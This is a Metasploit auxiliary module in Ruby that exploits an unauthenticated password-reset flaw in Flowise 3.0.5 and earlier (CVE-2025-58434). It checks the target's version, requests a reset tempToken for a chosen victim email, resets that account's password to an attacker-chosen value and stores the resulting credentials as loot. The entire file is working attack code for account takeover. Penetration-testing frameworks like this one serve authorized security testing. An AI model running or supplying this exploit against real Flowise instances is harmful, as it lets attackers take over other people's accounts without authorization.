##
# This module requires Metasploit: https://metasploit.com/download
##

require 'uri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Flowise Authentication Bypass',
        'Description' => %q{
          In Flowise versions 3.0.5 and earlier, the `forgot-password` endpoint in Flowise returns sensitive information including
          a valid password reset `tempToken` without authentication or verification.
          This enables any attacker to generate a reset token for arbitrary users and directly reset their password, leading to a
          complete account takeover (ATO).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Richard Howe',
          'Isaac David',
          'Arthur Gervais'
        ],
        'References' => [
          ['CVE', '2025-58434'],
          ['EDB', '52557'],
          ['GHSA', 'wgpv-6j63-x5ph']
        ],
        'DisclosureDate' => '2025-09-12',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(3000),
        OptString.new('TARGETURI', [true, 'Base path of the Flowise dashboard', '/']),
        OptString.new('EMAIL', [true, 'The email address of victim user', 'admin@local']),
        OptString.new('NEWPASSWORD', [true, 'The new password assigned to the victim user', 'password123'])
      ]
    )
  end

  def check
    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'api/v1/version')
      }
    )

    unless res&.code == 200
      return Exploit::CheckCode::Unknown(
        'No response or unexpected status from Flowise API'
      )
    end

    flow_version = res.get_json_document['version']

    unless Rex::Version.new(flow_version) <= Rex::Version.new('3.0.5')
      return Exploit::CheckCode::Safe(
        "Flowise version #{flow_version} is not vulnerable"
      )
    end

    Exploit::CheckCode::Appears(
      "Flowise version #{flow_version} is in the vulnerable range"
    )
  end

  def get_reset_token(email)
    res = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'api/v1/account/forgot-password'),
        'headers' => {
          'Content-Type' => 'application/json'
        },
        'data' => {
          'user' => {
            email: email
          }
        }.to_json
      }
    )

    fail_with(Failure::Unknown, 'Unexpected server reply while requesting reset token.') unless res&.code == 201

    res.get_json_document.dig('user', 'tempToken')
  end

  def reset_password(email, token, password)
    res = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'api/v1/account/reset-password'),
        'headers' => {
          'Content-Type' => 'application/json'
        },
        'data' => {
          'user' => {
            'email' => email,
            'tempToken' => token,
            'password' => password
          }
        }.to_json
      }
    )

    fail_with(Failure::Unknown, 'Unexpected server reply while resetting password.') unless res&.code == 201
  end

  def run
    email = datastore['EMAIL']
    new_password = datastore['NEWPASSWORD']

    # Request reset token
    reset_token = get_reset_token(email)

    if reset_token.empty?
      fail_with(Failure::UnexpectedReply, 'Could not retrieve password reset token for victim email address.')
    end

    # Reset user password
    reset_password(email, reset_token, new_password)

    loot = {
      'email' => email,
      'password' => new_password
    }.to_json

    loot_path = store_loot(
      'flowise.files',
      'text/plain',
      rhost,
      loot,
      'flowise.txt',
      'Flowise login credentials retrieved via unauthenticated user password reset'
    )

    print_good("Password reset successful. Loot stored in: #{loot_path}")
  end
end
